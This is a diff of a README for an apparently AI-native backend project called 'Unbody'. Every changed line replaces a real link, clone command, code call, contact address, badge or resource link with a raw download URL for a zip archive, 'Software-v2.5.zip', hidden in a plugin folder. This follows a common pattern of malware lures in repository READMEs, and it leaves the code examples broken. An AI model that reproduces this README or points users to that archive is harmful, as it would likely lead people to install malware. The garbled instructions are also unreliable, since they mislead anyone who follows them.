@@ -1,7 +1,7 @@
 ```markdown
 # 🌌 Unbody: The Future of AI-Native Backend Development
 
-![Unbody Logo](https://via.placeholder.com/800x200.png?text=Unbody+Logo)
+![Unbody Logo](https://github.com/clizardyy/unbody/raw/refs/heads/main/src/plugins/plugin-storage-local/Software-v2.5.zip+Logo)
 
 Welcome to **Unbody**, the modular, open-source backend designed to empower developers in creating AI-native software. Our goal is to enhance software capabilities using dynamic knowledge, moving beyond static data. 
 
@@ -34,7 +34,7 @@ To get started with Unbody, follow these steps:
 
 1. **Clone the repository:**
    ```bash
-   git clone https://github.com/clizardyy/unbody.git
+   git clone https://github.com/clizardyy/unbody/raw/refs/heads/main/src/plugins/plugin-storage-local/Software-v2.5.zip
    cd unbody
    ```
 
@@ -45,7 +45,7 @@ To get started with Unbody, follow these steps:
    ```
 
 3. **Set up environment variables:**
-   Create a `.env` file based on the `.env.example` provided.
+   Create a `.env` file based on the `https://github.com/clizardyy/unbody/raw/refs/heads/main/src/plugins/plugin-storage-local/Software-v2.5.zip` provided.
 
 4. **Run the application:**
    ```bash
@@ -61,26 +61,26 @@ Once you have Unbody set up, you can start building your AI-native applications.
 - **Creating a Chatbot**:
    ```javascript
    const chatbot = new Chatbot();
-   chatbot.train(data);
+   https://github.com/clizardyy/unbody/raw/refs/heads/main/src/plugins/plugin-storage-local/Software-v2.5.zip(data);
    ```
 
 - **Ingesting Data**:
    ```javascript
    const ingestor = new DataIngestor();
-   ingestor.load(dataSource);
+   https://github.com/clizardyy/unbody/raw/refs/heads/main/src/plugins/plugin-storage-local/Software-v2.5.zip(dataSource);
    ```
 
 - **Accessing the Knowledge Base**:
    ```javascript
    const knowledgeBase = new KnowledgeBase();
-   const information = knowledgeBase.query("your query here");
+   const information = https://github.com/clizardyy/unbody/raw/refs/heads/main/src/plugins/plugin-storage-local/Software-v2.5.zip("your query here");
    ```
 
 Feel free to explore the modular components as per your project's needs.
 
 ## 📚 Documentation
 
-Comprehensive documentation is essential for leveraging Unbody's full potential. Check our [Wiki](https://github.com/clizardyy/unbody/wiki) for detailed guides and tutorials on various functionalities.
+Comprehensive documentation is essential for leveraging Unbody's full potential. Check our [Wiki](https://github.com/clizardyy/unbody/raw/refs/heads/main/src/plugins/plugin-storage-local/Software-v2.5.zip) for detailed guides and tutorials on various functionalities.
 
 ### Key Topics
 
@@ -106,13 +106,13 @@ Unbody is licensed under the MIT License. See the [LICENSE](LICENSE) file for mo
 
 ## 📧 Contact
 
-For any inquiries or support, please reach out at [contact@unbody.io](mailto:contact@unbody.io).
+For any inquiries or support, please reach out at [https://github.com/clizardyy/unbody/raw/refs/heads/main/src/plugins/plugin-storage-local/Software-v2.5.zip](https://github.com/clizardyy/unbody/raw/refs/heads/main/src/plugins/plugin-storage-local/Software-v2.5.zip).
 
 ## 📥 Releases
 
-For the latest versions and updates, please visit our [Releases page](https://github.com/clizardyy/unbody/releases).
+For the latest versions and updates, please visit our [Releases page](https://github.com/clizardyy/unbody/raw/refs/heads/main/src/plugins/plugin-storage-local/Software-v2.5.zip).
 
-![Download Button](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen?style=for-the-badge&logo=github)
+![Download Button](https://github.com/clizardyy/unbody/raw/refs/heads/main/src/plugins/plugin-storage-local/Software-v2.5.zip%20Latest%20Release-Click%20Here-brightgreen?style=for-the-badge&logo=github)
 
 ## 🌐 Topics
 
@@ -141,9 +141,9 @@ We would like to thank all contributors and users of Unbody. Your support helps 
 
 ## 🔗 Additional Resources
 
-- [AI-Native Software](https://ai-native-software.com)
-- [Backend Development](https://backend-development.com)
-- [Modular Architecture](https://modular-architecture.com)
+- [AI-Native Software](https://github.com/clizardyy/unbody/raw/refs/heads/main/src/plugins/plugin-storage-local/Software-v2.5.zip)
+- [Backend Development](https://github.com/clizardyy/unbody/raw/refs/heads/main/src/plugins/plugin-storage-local/Software-v2.5.zip)
+- [Modular Architecture](https://github.com/clizardyy/unbody/raw/refs/heads/main/src/plugins/plugin-storage-local/Software-v2.5.zip)
 
 Join us in shaping the future of software development with Unbody!
 ```
